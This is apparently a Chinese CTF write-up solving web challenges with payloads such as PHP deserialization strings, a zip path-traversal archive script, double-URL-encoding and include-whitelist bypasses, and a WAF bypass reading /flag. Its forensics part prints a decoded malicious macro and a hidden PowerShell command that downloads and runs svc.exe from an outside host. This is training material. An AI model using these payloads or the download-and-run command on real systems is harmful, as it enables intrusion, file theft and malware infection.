<h1 id="web">web</h1>
<h2 id="贪吃蛇">贪吃蛇</h2>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905145627879.png" alt="image.png" loading="lazy"><br>
有点难玩，直接看源代码<br>
重点代码片段</p>
<pre><code class="language-js">function submitScore(finalScoreValue) {
            fetch('api.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({score: finalScoreValue})
            })
            .then(function(resp) { return resp.json(); })
            .then(function(data) {
                rewardPanel.style.display = 'block';
                if (data.success) {
                    rewardPanel.innerHTML = '&amp;#127942; 隐藏奖励解锁！&lt;br&gt;' + data.message;
                } else {
                    rewardPanel.innerHTML = data.message;
                }
            })
            .catch(function() {
                rewardPanel.style.display = 'block';
                rewardPanel.innerHTML = '成绩提交失败，请稍后再试';
            });
        }
</code></pre>
<p>我们向api.php发送POST请求<code>{"score":"999999999999999"}</code>即可拿到flag</p>
<h2 id="php反序列">php反序列</h2>
<pre><code class="language-php">&lt;?php
session_start();
error_reporting(0);

if (empty($_SESSION['logged_in'])) {
    header('Location: index.php');
    exit;
}

include __DIR__ . '/flag.php';

class AuditTicket
{
    public $role = 'guest';

    public function __destruct()
    {
        global $flag;

        if ($this-&gt;role === 'admin') {
            echo '&lt;h3 style="color:green"&gt;反序列化成功！&lt;/h3&gt;';
            echo '&lt;p&gt;' . htmlspecialchars($flag, ENT_QUOTES, 'UTF-8') . '&lt;/p&gt;';
        }
    }
}

$message = '';
$object = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $payload = $_POST['payload'] ?? '';

    if ($payload === '') {
        $message = 'payload 不能为空';
    } else {
        $object = unserialize($payload);

        if ($object instanceof AuditTicket) {
            $message = '对象恢复成功';
        } else {
            $message = '反序列化失败';
        }
    }
}

highlight_file(__FILE__);
?&gt;

</code></pre>
<p>脚本</p>
<pre><code class="language-php">&lt;?php
class AuditTicket
{
    public $role = 'admin';
}

$a=new AuditTicket();
$b=serialize($a);
echo $b;
</code></pre>
<h2 id="消消乐">消消乐</h2>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905171541155.png" alt="image.png" loading="lazy"><br>
游戏不算难可以直接玩出来<br>
查看源代码<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905171612982.png" alt="image.png" loading="lazy"></p>
<p>数据来源</p>
<pre><code>&lt;div id="app-meta" data-v="0731626d648f81d06d6ce180ba733b9b0f" hidden&gt;&lt;/div&gt;
</code></pre>
<p>下面会用到他</p>
<pre><code>var hex = cfg.dataset.v.substr(2);   // 丢掉 "07"
// hex = "31626d648f81d06d6ce180ba733b9b0f"  (32 位 = 16 字节)
</code></pre>
<p>这里可以直接在控制台得到输出<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905175503264.png" alt="image.png" loading="lazy"></p>
<p>逐字节 XOR 解密(密钥 = 0x37)</p>
<pre><code>var key = 0x37;                         // 固定密钥(十进制 55)
var bytes = [];
for (var i = 0; i &lt; hex.length; i += 2) {
    bytes.push(parseInt(hex.substr(i, 2), 16) ^ key);
}
</code></pre>
<pre><code>31^37=06  62^37=55  6d^37=5a  64^37=53
8f^37=b8  81^37=b6  d0^37=e7  6d^37=5a
6c^37=5b  e1^37=d6  80^37=b7  ba^37=8d
73^37=44  3b^37=0c  9b^37=ac  0f^37=38
</code></pre>
<p>解密出的 16 个字节:<code>06 55 5a 53 b8 b6 e7 5a 5b d6 b7 8d 44 0c ac 38</code><br>
再套flag壳</p>
<pre><code>var result = String.fromCharCode(102,108,97,103,123) + hash + String.fromCharCode(125);
</code></pre>
<p><code>fromCharCode</code> 逐个转字符:</p>
<table>
<thead>
<tr>
<th>码</th>
<th>字符</th>
</tr>
</thead>
<tbody>
<tr>
<td>102</td>
<td>f</td>
</tr>
<tr>
<td>108</td>
<td>l</td>
</tr>
<tr>
<td>97</td>
<td>a</td>
</tr>
<tr>
<td>103</td>
<td>g</td>
</tr>
<tr>
<td>123</td>
<td>{</td>
</tr>
<tr>
<td>125</td>
<td>}</td>
</tr>
<tr>
<td>即 <code>"flag{" + hash + "}"</code>。</td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="guess">guess</h2>
<p>/memo查看备忘文件</p>
<pre><code>&lt;h1&gt;备忘卡片&lt;/h1&gt;
&lt;pre&gt;comet archive initialized&lt;/pre&gt;
&lt;p class="small"&gt;核心变量已进入渲染上下文，但默认模板不会展示。&lt;/p&gt;
</code></pre>
<p>/status<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905203528700.png" alt="image.png" loading="lazy"></p>
<p>/theme<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905204721150.png" alt="image.png" loading="lazy"><br>
文件上传<br>
尝试上传一个正常的符合要求的.zip，回显得到id<br>
但是/status里提示的目录都是404...<br>
我们大概能猜到/memo是/app/templates/memo.html<br>
上传一个简单的memo.html测试</p>
<pre><code>&lt;pre&gt;{{ 7*7 }}&lt;/pre&gt;
</code></pre>
<p>可是/memo没反应<br>
据说zip解压有一个古老的坑<br>
解压过程中文件名可能会被直接拼接到路径中，造成路径穿越漏洞<br>
但是windows的文件名不允许有/<br>
借助pyhton脚本</p>
<pre><code class="language-python">import zipfile

with zipfile.ZipFile("theme.zip", "w") as z:
    z.writestr("manifest.txt", "name=x\n")
    z.writestr("../../../templates/memo.html", "&lt;pre&gt;{{flag}}&lt;/pre&gt;")
</code></pre>
<p>上传后访问/memo拿到flag</p>
<h2 id="打赏">打赏</h2>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260906100304765.png" alt="image.png" loading="lazy"><br>
打赏后拿到假flag<br>
查看源代码</p>
<pre><code>// 自定义你的flag
        const flag = "flag{Fake_Pay_No_Money_2026_HTML}";
        function showFlag() {
            let emailVal = document.getElementById("mail").value;
            //不校验真实邮箱、无支付流程
            if (emailVal.length &gt; 0) {
                alert("模拟支付成功，无需真实转账！\n你的flag：" + flag);
            } else {
                alert("邮箱框随便输入任意字符即可模拟支付拿flag");
                //QD2AHXMGSJMMG2NM
            }
        }
</code></pre>
<p>下面有一个加密的注释，尝试解密<br>
这里真搓不出来，问了ds是先首位反转再base32解码<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260906101630489.png" alt="image.png" loading="lazy"><br>
访问ctf123.php</p>
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
include __DIR__ . '/flag.php';

echo "&lt;h2&gt;Welcome&lt;/h2&gt;";

function stop($msg) {
    die(htmlspecialchars($msg, ENT_QUOTES, 'UTF-8') . "&lt;br/&gt;\n");
} 

$role = $_COOKIE['role'] ?? 'guest';

if ($role !== 'auditor') {
    stop('第一关：你还不是 auditor');
}

echo "第一关通过&lt;br/&gt;\n";

$route = $_GET['route'] ?? '';

if (preg_match('/admin/i', $route)) {
    stop('第二关：检测到敏感路由 admin');
}

$route = urldecode($route);

if ($route !== 'admin/panel') {
    stop('第二关：没有进入管理路由');
}

echo "第二关通过&lt;br/&gt;\n";
echo "恭喜通关！&lt;br/&gt;\n";
echo htmlspecialchars($flag, ENT_QUOTES, 'UTF-8');
?&gt;
</code></pre>
<p>第一关</p>
<pre><code>Cookie: role=auditor
</code></pre>
<p>第二关把admin双重url编码</p>
<pre><code>/ctf123.php?route=%2561%2564%256d%2569%256e%2Fpanel
</code></pre>
<p>拿到flag</p>

<h2 id="minisite">MiniSite</h2>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260906102524028.png" alt="image.png" loading="lazy"><br>
右上角三个功能分别访问<br>
/?f=home.php<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260906102623508.png" alt="image.png" loading="lazy"><br>
/?f=about.php<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260906102649366.png" alt="image.png" loading="lazy"><br>
/?f=source.php<br>
提示：index.php 的完整源码 —— 仔细看看 FileGuard 是怎么校验的。<br>
<strong>Hint:</strong> 校验通过后，<code>include</code> 用的是哪个变量？它和校验时看到的一样吗？<br>
Mini Site · 有些文件不在白名单里，也不在 web 根目录下</p>
<pre><code class="language-php">&lt;?php
// TODO: 上线前删掉这行 —— /sssseeeeccccrrrrreeeetttt 别忘了清理

class FileGuard
{
    public static function checkFile(&amp;$page)
    {
        $whitelist = ["home.php", "about.php", "source.php"];

        if (!isset($page) || !is_string($page)) {
            echo "you can't see it";
            return false;
        }
        if (in_array($page, $whitelist, true)) {
            return true;
        }
        $_page = substr(
            $page,
            0,
            strpos($page . '#', '#')
        );
        if (in_array($_page, $whitelist, true)) {
            return true;
        }

        $_page = rawurldecode($page);
        $_page = substr(
            $_page,
            0,
            strpos($_page . '#', '#')
        );
        if (in_array($_page, $whitelist, true)) {
            return true;
        }

        echo "you can't see it";
        return false;
    }
}

if (!empty($_REQUEST['f'])
    &amp;&amp; is_string($_REQUEST['f'])
    &amp;&amp; FileGuard::checkFile($_REQUEST['f'])
) {
    include $_REQUEST['f'];
    exit;
}
?&gt;

<ol>
<li>直接匹配 whitelist → 返回 true</li>
<li>带&nbsp;<code>#</code>&nbsp;截断后匹配 → 返回 true</li>
<li>URL 解码后再匹配 → 返回 true</li>
<li>都没匹配到 → 返回 false<br>
我们尝试使用#截断配合路径穿越</li>
</ol>
<pre><code>/?f=source.php%23/../about.php
</code></pre>
<p>成功穿越到about.php<br>
去看看/sssseeeeccccrrrrreeeetttt<br>
最终payload</p>
<pre><code>/?f=source.php%23/../../../../sssseeeeccccrrrrreeeetttt
</code></pre>
<p>flag就在这里</p>
<h2 id="cryweb">cryweb</h2>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260906104739678.png" alt="image.png" loading="lazy"><br>
测试了ctfer 0 admin null 找不到规律也没找到解密方法</p>
<h2 id="魔法导入器">魔法导入器</h2>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260906115431933.png" alt="image.png" loading="lazy"><br>
查看源代码<br>
/?source</p>
<pre><code class="language-php">&lt;?php
class FileViewer
{
    public $path;

    public function __toString()#验证文件路径存在并包含
    {
        if ($this-&gt;path &amp;&amp; file_exists($this-&gt;path)) {
            return file_get_contents($this-&gt;path);
        }
        return "[文件未找到]";
    }
}

class Welcome
{
    public $user;

    public function __destruct()
    {
        echo "&lt;div class='bye-msg'&gt;再见，" . $this-&gt;user . "！&lt;/div&gt;";
    }
}

class Profile
{
    public $name;
    public $bio;

    public function __wakeup()
    {
        if (strlen($this-&gt;name) &gt; 30) {
            $this-&gt;name = substr($this-&gt;name, 0, 30);
        }
        if (strlen($this-&gt;bio) &gt; 200) {
            $this-&gt;bio = substr($this-&gt;bio, 0, 200);
        }
    }
}

function validate_serialized($data)
{
    $rules = [
        '/s:\d+:"[^"]*flag[^"]*"/' =&gt; '拦截：检测到 flag 路径 (s:string)',
        '/O:\d+:"(?!Welcome|Profile|FileViewer)[^"]+"/' =&gt; '拦截：不允许的类',
    ];
    foreach ($rules as $pattern =&gt; $msg) {
        if (preg_match($pattern, $data)) {
            return [false, $msg];
        }
    }
    return [true, '验证通过'];
}

// Source code view
if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    exit;
}

// Logic
$result = '';
$error = '';
$destruct_output = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; isset($_POST['data'])) {
    $raw = trim($_POST['data']);

    list($ok, $msg) = validate_serialized($raw);
    if (!$ok) {
        $error = $msg;
    } else {
        $obj = @unserialize($raw);
        if ($obj === false &amp;&amp; $raw !== 'b:0;') {
            $error = '反序列化失败：格式无效';
        } else {
            $result = '导入成功！对象类型：' . get_class($obj);
            // Force __destruct() NOW so output is visible on page
            ob_start();
            $obj = null;
            $destruct_output = ob_get_clean();
        }
    }
}

$demo = new Profile();
$demo-&gt;name = 'Alice';
$demo-&gt;bio = 'CTF Player';
$export = serialize($demo);
?&gt;
</code></pre>
<p>观察发现我们应该用FileViewer的__toString方法读取文件<br>
但是这个方法只是return，没有输出<br>
正好我们借助Welcome的魔术方法__destruct输出，还可以触发__toString</p>
<pre><code class="language-php">&lt;?php
class FileViewer
{
    public $path;

    public function __toString()#验证文件路径存在并包含
    {
        if ($this-&gt;path &amp;&amp; file_exists($this-&gt;path)) {
            return file_get_contents($this-&gt;path);
        }
        return "[文件未找到]";
    }
}

class Welcome
{
    public $user;

    public function __destruct()
    {
        echo "&lt;div class='bye-msg'&gt;再见，" . $this-&gt;user . "！&lt;/div&gt;";
    }
}

$demo = new Welcome();
$demo-&gt;user = new FileViewer();
$demo-&gt;user-&gt;path = "/etc/passwd"; #这里可以改成你想要读取的文件路径
$export = serialize($demo);
echo $export;
?&gt;
</code></pre>
<p>可以读取文件了，但是过滤比较严格<br>
看到还有一个类没用上</p>
<pre><code class="language-php">class Profile
{
    public $name;
    public $bio;

    public function __wakeup()
    {
        if (strlen($this-&gt;name) &gt; 30) {
            $this-&gt;name = substr($this-&gt;name, 0, 30);
        }
        if (strlen($this-&gt;bio) &gt; 200) {
            $this-&gt;bio = substr($this-&gt;bio, 0, 200);
        }
    }
}
</code></pre>
<p>可以帮助我们处理字符长度<br>
但是题目逻辑是先进行过滤再反序列化<br>
思考能不能直接绕过过滤，尝试在序列化字符串中加入"破坏正则判断，同时搭配路径穿越<br>
好消息是</p>
<pre><code>/etc/../1"/../flag
</code></pre>
<p>确实没有触发waf<br>
坏消息是回显文件未找到，同样的方法读取/etc/passwd也是文件未找到<br>
原理回头再研究<br>
正确思路是<br>
正则waf只匹配了小写x，放过了大写S<br>
大写&nbsp;<code>S:</code>&nbsp;表示字符串中可用&nbsp;<code>\xx</code>（两位十六进制）转义字节<br>
把&nbsp;<code>flag</code>&nbsp;的&nbsp;<code>f</code>（0x66）写成&nbsp;<code>\66</code>，即&nbsp;<code>S:5:"/\66lag"</code><br>
最终payload</p>
<pre><code>O:7:"Welcome":1:{s:4:"user";O:10:"FileViewer":1:{s:4:"path";S:5:"/\66lag";}}
</code></pre>
<p>好了，现在看看为什么路径穿越的方法不行<br>
之前就在windows和linux上做过实验<br>
其实是可以实现路径穿越的<br>
唯一不同就是windows可以一个引号<code>/1"/../</code>穿越<br>
但linux必须要闭合引号才会执行<code>/1""/../</code><br>
问下ai</p>
<table>
<thead>
<tr>
<th>你的&nbsp;<code>cd</code>（逻辑）</th>
<th>服务器&nbsp;<code>file_get_contents</code>（物理）</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>谁解析&nbsp;<code>..</code></td>
<td>bash 在字符串层面折叠</td>
<td>内核逐组件查目录</td>
</tr>
<tr>
<td><code>X/..</code>&nbsp;要求 X 存在吗</td>
<td>不要求（先折叠掉）</td>
<td><strong>要求</strong>（查不到就 ENOENT）</td>
</tr>
<tr>
<td><code>"</code>&nbsp;去哪了</td>
<td>被 shell 吃掉，变&nbsp;<code>1</code></td>
<td>PHP 字符串里的真实字节，成文件名</td>
</tr>
<tr>
<td>原来这样吗</td>
<td></td>
<td></td>
</tr>
<tr>
<td>可惜linux默认没有文件名包含"的文件，不然还能操作一下</td>
<td></td>
<td></td>
</tr>
<tr>
<td>此路不通</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>

</code></pre>

<h2 id="letter">letter</h2>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905105051088.png" alt="image.png" loading="lazy"><br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905105131437.png" alt="image.png" loading="lazy"><br>
全是200C和200B<br>
脚本如下</p>
<pre><code class="language-python">data = open(r'E:\firefox\letter\letter.txt', encoding='utf-8').read().rstrip('\n')
bits = ''.join('0' if c == '\u200b' else '1' for c in data if c in '\u200b\u200c')
print(''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)))
</code></pre>
<h2 id="deploy-2">deploy-2</h2>
<blockquote>
<p>还原 docm 宏里混淆的 PowerShell 命令，得到下载 payload 的完整 URL。</p>
</blockquote>
<p>下载了.docm文件，我们改后缀为.zip<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905160023642.png" alt="image.png" loading="lazy"><br>
查看.bin文件</p>
<pre><code>D0 CF 11 E0 A1 B1 1A E1                                                                                                                        VBA_Project_Payload_v1_GreyLynxAttribute VB_Name = "Module1"
' GreyLynx payroll update bootstrap
' NOTE: string below is encoded: base64(XOR 0x23(payload))
Sub AutoOpen()
    Dim enc As String
    enc = "U0xURlFQS0ZPTwMOTUxTAw5UA0tKR0dGTQMOQAMBRkBLTAN4CX4DZFFGWm9aTVsDVlNHQldGA0FMTFdQV1FCUxgDSlRRA0tXV1MZDAxAR00NRFFGWk9KTVsOQExNUFZPV0pNRA1bWlkZGxMbEwxWU0dCV0YMUFVADUZbRgMObFZXZUpPRgMHRk1VGXdmbnN/UFVADUZbRhgDUFdCUVcDB0ZNVRl3Zm5zf1BVQA1GW0YB"
    Dim ps As String
    ps = DecodeXor(enc)
    Shell ps, vbHide
End Sub

Function DecodeXor(s As String) As String
    ' decode chain: Base64 decode, then XOR each byte with 0x23
    DecodeXor = s
End Function
</code></pre>
<p>简单加密<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905160106758.png" alt="image.png" loading="lazy"></p>
<pre><code>powershell -nop -w hidden -c "echo [*] GreyLynx update bootstrap; iwr http://cdn.greylinx-consulting.xyz:8080/update/svc.exe -OutFile $env:TEMP\svc.exe; start $env:TEMP\svc.exe"
</code></pre>
<p>flag是cdn.greylinx-consulting.xyz:8080/update/svc.exe不包括http:</p>
<h2 id="deploy-3">deploy-3</h2>
<blockquote>
<p>C2 服务器的 IP:端口。</p>
</blockquote>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905165654159.png" alt="image.png" loading="lazy"><br>
wireshark打开<br>
过滤流量</p>
<pre><code>http.request.method == POST and http.request.uri contains "gate.php"
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905165940598.png" alt="image.png" loading="lazy"><br>
发现destination是<strong>203.0.113.45</strong><br>
其实这就是外联的c2服务器的ip<br>
继续往下翻还有域名和端口<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905170254303.png" alt="image.png" loading="lazy"><br>
不过做的时候我是右键-FOLLOW-http stream<br>
<img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260905170357500.png" alt="image.png" loading="lazy"><br>
只拿到了域名和端口<br>
然后去找dns的解析记录</p>
<pre><code class="language-text">dns.qry.name contains "c2.greylinx-consulting.xyz"
</code></pre>
